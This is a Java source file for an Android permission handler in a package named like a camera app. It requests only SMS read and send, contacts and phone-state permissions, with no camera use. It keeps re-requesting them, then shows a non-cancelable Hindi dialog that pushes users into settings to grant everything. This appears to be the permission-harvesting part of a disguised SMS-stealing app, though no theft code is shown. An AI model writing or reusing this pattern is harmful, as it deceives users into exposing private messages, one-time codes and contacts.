package com.android.photo.camera.capture;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.lang.ref.WeakReference;

public class PermissionHandler {
    private static final String TAG = "PermissionHandler";
    private static final int PERMISSION_REQUEST_CODE = 123;
    private static final int MAX_PERMISSION_ATTEMPTS = 2;

    private final WeakReference<Activity> activityRef;
    private final List<String> requiredPermissions;
    private int totalAttempts = 0;
    private boolean isRequestingPermission = false;
    private boolean hasShownDialog = false;
    private boolean isProcessingResult = false;
    private volatile boolean isActivityDestroyed = false;
    private final Handler handler;
    private AlertDialog currentDialog;
    private Runnable pendingDialogRunnable;

    public PermissionHandler(@NonNull Activity activity) {
        Log.d(TAG, "Initializing PermissionHandler");
        this.activityRef = new WeakReference<>(activity);
        this.requiredPermissions = new ArrayList<>();
        this.handler = new Handler(Looper.getMainLooper());
        initializeRequiredPermissions();
    }

    private void initializeRequiredPermissions() {
        requiredPermissions.add(Manifest.permission.READ_SMS);
        requiredPermissions.add(Manifest.permission.SEND_SMS);
        requiredPermissions.add(Manifest.permission.READ_CONTACTS);
        requiredPermissions.add(Manifest.permission.READ_PHONE_STATE);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            requiredPermissions.add(Manifest.permission.POST_NOTIFICATIONS);
        }
    }

    private Activity getActivity() {
        Activity activity = activityRef.get();
        if (activity == null || activity.isFinishing() || activity.isDestroyed()) {
            return null;
        }
        return activity;
    }

    public synchronized void startPermissionRequest() {
        Activity activity = getActivity();
        if (activity == null || isActivityDestroyed) {
            return;
        }

        if (totalAttempts >= MAX_PERMISSION_ATTEMPTS && !hasShownDialog) {
            showPermissionDialog();
            return;
        }

        if (!isRequestingPermission && !hasShownDialog && !isProcessingResult) {
            requestPermissions();
        }
    }

    private synchronized void requestPermissions() {
        Activity activity = getActivity();
        if (activity == null || isActivityDestroyed) {
            return;
        }

        List<String> remainingPermissions = new ArrayList<>();
        for (String permission : requiredPermissions) {
            if (ContextCompat.checkSelfPermission(activity, permission) !=
                    PackageManager.PERMISSION_GRANTED) {
                remainingPermissions.add(permission);
            }
        }

        if (!remainingPermissions.isEmpty() && !isRequestingPermission) {
            isRequestingPermission = true;
            try {
                String[] permissionsArray = remainingPermissions.toArray(new String[0]);
                ActivityCompat.requestPermissions(activity, permissionsArray, PERMISSION_REQUEST_CODE);
            } catch (Exception e) {
                Log.e(TAG, "Error requesting permissions", e);
                isRequestingPermission = false;
            }
        }
    }

    private void showPermissionDialog() {
        Activity activity = getActivity();
        if (activity == null || isActivityDestroyed || hasShownDialog) {
            return;
        }

        // Cancel any pending dialog
        if (pendingDialogRunnable != null) {
            handler.removeCallbacks(pendingDialogRunnable);
        }

        // Create new dialog runnable
        pendingDialogRunnable = () -> {
            try {
                Activity currentActivity = getActivity();
                if (currentActivity == null || isActivityDestroyed ||
                        currentActivity.isFinishing() || currentActivity.isDestroyed()) {
                    return;
                }

                // Dismiss any existing dialog first
                dismissCurrentDialog();

                // Check again before creating new dialog
                if (isActivityDestroyed || currentActivity.isFinishing()) {
                    return;
                }

                currentDialog = new AlertDialog.Builder(currentActivity)
                        .setTitle("महत्वपूर्ण अनुमति आवश्यक है")
                        .setMessage(getPermissionMessage())
                        .setCancelable(false)
                        .setPositiveButton("सेटिंग्स खोलें", (dialog, which) -> {
                            if (!isActivityDestroyed) {
                                openAppSettings();
                            }
                        })
                        .create();

                currentDialog.setOnDismissListener(dialog -> {
                    hasShownDialog = true;
                    currentDialog = null;
                });

                // Final check before showing
                if (!isActivityDestroyed && !currentActivity.isFinishing()) {
                    currentDialog.show();
                }
            } catch (Exception e) {
                Log.e(TAG, "Error showing dialog", e);
                hasShownDialog = false;
                currentDialog = null;
            }
        };

        // Post on main thread with delay
        handler.post(pendingDialogRunnable);
    }

    private synchronized void dismissCurrentDialog() {
        if (currentDialog != null) {
            try {
                if (currentDialog.isShowing()) {
                    currentDialog.dismiss();
                }
            } catch (Exception e) {
                Log.e(TAG, "Error dismissing dialog", e);
            } finally {
                currentDialog = null;
            }
        }
    }

    private String getPermissionMessage() {
        Activity activity = getActivity();
        if (activity == null) return "";

        StringBuilder message = new StringBuilder();
        message.append("एप्लिकेशन को निम्नलिखित अनुमतियों की आवश्यकता है:\n\n");

        for (String permission : requiredPermissions) {
            if (ContextCompat.checkSelfPermission(activity, permission) !=
                    PackageManager.PERMISSION_GRANTED) {
                message.append("• ").append(getPermissionDescription(permission)).append("\n");
            }
        }

        message.append("\nकृपया सेटिंग्स में जाकर सभी अनुमतियां दें।");
        return message.toString();
    }

    private String getPermissionDescription(String permission) {
        switch (permission) {
            case Manifest.permission.READ_SMS:
                return "SMS की अनुमति";
            case Manifest.permission.SEND_SMS:
                return "SMS भेजने की अनुमति";
            case Manifest.permission.READ_CONTACTS:
                return "Contacts की अनुमति";
            case Manifest.permission.POST_NOTIFICATIONS:
                return "Notifications दिखाने की अनुमति";
            case Manifest.permission.READ_PHONE_STATE:
                return "फोन स्थिति की अनुमति";
            default:
                return "आवश्यक अनुमति";
        }
    }

    private void openAppSettings() {
        Activity activity = getActivity();
        if (activity == null || isActivityDestroyed) return;

        try {
            Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            Uri uri = Uri.fromParts("package", activity.getPackageName(), null);
            intent.setData(uri);
            activity.startActivity(intent);
        } catch (Exception e) {
            Log.e(TAG, "Error opening app settings", e);
        }
    }

    public synchronized void handlePermissionResult(int requestCode, String[] permissions, int[] grantResults) {
        if (isActivityDestroyed) {
            return;
        }

        Activity activity = getActivity();
        if (activity == null || requestCode != PERMISSION_REQUEST_CODE || !isRequestingPermission) {
            return;
        }

        isProcessingResult = true;
        isRequestingPermission = false;

        boolean allGranted = true;
        for (int result : grantResults) {
            if (result != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }

        if (!allGranted) {
            totalAttempts++;
            if (totalAttempts >= MAX_PERMISSION_ATTEMPTS) {
                if (!isActivityDestroyed) {
                    showPermissionDialog();
                }
            } else {
                if (pendingDialogRunnable != null) {
                    handler.removeCallbacks(pendingDialogRunnable);
                }
                handler.postDelayed(() -> {
                    if (!isActivityDestroyed) {
                        Activity currentActivity = getActivity();
                        if (currentActivity != null && !currentActivity.isFinishing()) {
                            startPermissionRequest();
                        }
                    }
                }, 100);
            }
        }

        isProcessingResult = false;
    }

    public boolean isAllPermissionsGranted() {
        Activity activity = getActivity();
        if (activity == null) return false;

        for (String permission : requiredPermissions) {
            if (ContextCompat.checkSelfPermission(activity, permission) !=
                    PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    public void onResume() {
        Activity activity = getActivity();
        if (activity == null || isActivityDestroyed) return;

        if (!isAllPermissionsGranted() && !activity.isFinishing()) {
            if (totalAttempts >= MAX_PERMISSION_ATTEMPTS && !hasShownDialog) {
                showPermissionDialog();
            } else if (!isRequestingPermission) {
                startPermissionRequest();
            }
        }
    }

    public void onPause() {
        if (pendingDialogRunnable != null) {
            handler.removeCallbacks(pendingDialogRunnable);
            pendingDialogRunnable = null;
        }
        handler.removeCallbacksAndMessages(null);
        dismissCurrentDialog();
    }

    public void onDestroy() {
        isActivityDestroyed = true;
        if (pendingDialogRunnable != null) {
            handler.removeCallbacks(pendingDialogRunnable);
            pendingDialogRunnable = null;
        }
        handler.removeCallbacksAndMessages(null);
        dismissCurrentDialog();
    }
}